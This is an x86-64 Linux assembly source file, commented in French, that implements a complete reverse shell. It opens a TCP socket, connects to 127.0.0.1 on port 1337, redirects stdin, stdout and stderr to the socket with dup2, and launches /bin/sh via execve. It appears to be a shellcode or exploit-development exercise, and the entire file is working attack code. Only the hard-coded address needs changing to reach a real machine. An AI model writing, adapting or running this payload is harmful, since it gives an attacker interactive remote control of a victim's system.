BITS 64

;Etablir un socket, Etablir une connexion, Utiliser le syscall write pour envoyer au socket

global _start

section .rodata
    shell_spawn db "/bin/sh",0

section .text


_start:
    jmp _init_socket


_init_socket:
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall
    push rax
    jmp _connect_sock

_connect_sock:
    mov rax, 42
    pop rdi
    push DWORD 0x100007f
    push WORD 0x3905
    push WORD 2
    mov rsi, rsp
    mov rdx, 0x10
    syscall
    push rdi
    jmp _duplicate_fd_stdin

_duplicate_fd_stdin:
    mov rax, 33
    pop rdi
    push rdi
    mov rsi, 0
    xor rdx, rdx
    syscall
    jmp _duplicate_fd_stdout

_duplicate_fd_stdout:
    mov rax, 33
    pop rdi
    push rdi
    mov rsi, 1
    xor rdx, rdx
    syscall
    jmp _duplicate_fd_stderr

_duplicate_fd_stderr:
    mov rax, 33
    pop rdi
    push rdi
    mov rsi, 2
    xor rdx, rdx
    syscall
    jmp _spawn_shell


_spawn_shell:
    mov rax, 59
    mov rdi, shell_spawn
    xor rsi, rsi
    xor rdx, rdx
    syscall
